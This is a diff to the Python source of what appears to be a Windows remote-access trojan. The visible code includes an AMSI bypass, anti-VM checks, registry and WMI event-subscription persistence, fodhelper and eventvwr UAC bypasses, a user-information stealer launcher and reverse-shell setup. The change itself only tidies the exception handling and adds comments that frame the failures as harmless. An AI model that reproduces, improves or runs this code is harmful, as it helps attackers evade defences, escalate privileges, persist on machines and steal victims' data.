@@ -143,7 +143,8 @@ def bypass_amsi():
             old_protection.value,
             ctypes.byref(old_protection)
         )
-    except:
+    except Exception as e:
+        # Silently handle AMSI bypass failure
         pass
 
 # Anti-VM detection
@@ -156,15 +157,17 @@ def check_virtual_machine():
                 for v_string in virtualization_strings:
                     if v_string in proc.info['name'].lower():
                         return True
-            except:
+            except Exception as e:
+                # Skip processes that can't be accessed
                 pass
                 
         try:
-            manufacturer = subprocess.check_output('wmic computersystem get manufacturer', shell=True).decode().lower()
+            manufacturer = subprocess.check_output(['wmic', 'computersystem', 'get', 'manufacturer'], shell=False).decode().lower()
             for v_string in virtualization_strings:
                 if v_string in manufacturer:
                     return True
-        except:
+        except Exception as e:
+            # Skip if wmic command fails
             pass
             
         try:
@@ -182,7 +185,8 @@ def check_virtual_machine():
                         for v_string in virtualization_strings:
                             if v_string in value.lower():
                                 return True
-                    except:
+                    except Exception as e:
+                        # Skip if registry value doesn't exist
                         pass
                     
                     try:
@@ -190,15 +194,19 @@ def check_virtual_machine():
                         for v_string in virtualization_strings:
                             if v_string in value.lower():
                                 return True
-                    except:
+                    except Exception as e:
+                        # Skip if registry value doesn't exist
                         pass
-                except:
+                except Exception as e:
+                    # Skip if registry key can't be accessed
                     pass
-        except:
+        except Exception as e:
+            # Skip if registry operations fail
             pass
             
         return False
-    except:
+    except Exception as e:
+        # Handle VM detection errors gracefully
         return False
 
 # Registry persistence setup
@@ -221,7 +229,8 @@ def add_to_startup():
                 winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, exe_path)
                 winreg.CloseKey(reg_key)
                 return True
-            except:
+            except Exception as e:
+                # Skip if registry key can't be written to
                 continue
                 
         try:
@@ -235,11 +244,13 @@ def add_to_startup():
                 binding_command = f'wmic /namespace:"\\\\root\\subscription" path __FilterToConsumerBinding create Filter="__EventFilter.Name=\\"WindowsEventFilter\\"", Consumer="CommandLineEventConsumer.Name=\\"WindowsConsumer\\""'
                 subprocess.run(binding_command, shell=True, capture_output=True)
                 return True
-        except:
+        except Exception as e:
+            # Skip if WMI commands fail
             pass
             
         return False
-    except:
+    except Exception as e:
+        # Handle startup persistence errors gracefully
         return False
 
 appdata = os.getenv('APPDATA')
@@ -284,12 +295,14 @@ def uac_bypass():
             # Clean up
             try:
                 winreg.DeleteKey(winreg.HKEY_CURRENT_USER, fodhelper_path)
-            except:
+            except Exception as e:
+                # Skip if cleanup fails
                 pass
                 
             if ctypes.windll.shell32.IsUserAnAdmin() == 1:
                 return True
-        except:
+        except Exception as e:
+            # Skip if FodHelper method fails
             pass
             
         # Eventvwr method
@@ -306,17 +319,20 @@ def uac_bypass():
             # Clean up
             try:
                 winreg.DeleteKey(winreg.HKEY_CURRENT_USER, eventvwr_path)
-            except:
+            except Exception as e:
+                # Skip if cleanup fails
                 pass
                 
             if ctypes.windll.shell32.IsUserAnAdmin() == 1:
                 return True
-        except:
+        except Exception as e:
+            # Skip if Eventvwr method fails
             pass
             
         # If we get here, bypass failed
         return False
-    except:
+    except Exception as e:
+        # Handle UAC bypass errors gracefully
         return False
 
 HELP_MENU = """
@@ -419,7 +435,8 @@ async def steal_user_info():
                 # Kill the process if it takes too long
                 try:
                     process.kill()
-                except:
+                except Exception as e:
+                    # Skip if process kill fails
                     pass
                 return "Error: Stealer execution timed out after 5 minutes"
                 
@@ -434,7 +451,8 @@ async def steal_user_info():
         try:
             if os.path.exists(exe_path):
                 os.remove(exe_path)
-        except:
+        except Exception as e:
+            # Skip if file removal fails
             pass
 
 async def start_reverse_shell(port=0):
@@ -458,7 +476,7 @@ async def start_reverse_shell(port=0):
                 timeout=5
             )
             ip = ip_response.text.strip()
-        except:
+        except Exception as e:
             try:
                 # Try second service if first fails
                 ip_response = await asyncio.wait_for(
@@ -466,7 +484,7 @@ async def start_reverse_shell(port=0):
                     timeout=5
                 )
                 ip = ip_response.text.strip()
-            except:
+            except Exception as e:
                 try:
                     # Try third service if second fails
                     ip_response = await asyncio.wait_for(
@@ -474,13 +492,13 @@ async def start_reverse_shell(port=0):
                         timeout=5
                     )
                     ip = ip_response.text.strip()
-                except:
+                except Exception as e:
                     # Use fallback if all services fail
                     try:
                         # Try to get the local IP as a last resort
                         hostname = socket.gethostname()
                         ip = socket.gethostbyname(hostname)
-                    except:
+                    except Exception as e:
                         pass  # Keep default 127.0.0.1
                     
         return server, ip, port
@@ -490,7 +508,8 @@ async def start_reverse_shell(port=0):
         if server:
             try:
                 server.close()
-            except:
+            except Exception as e:
+                # Skip if server close fails
                 pass
         return None, None, None
 
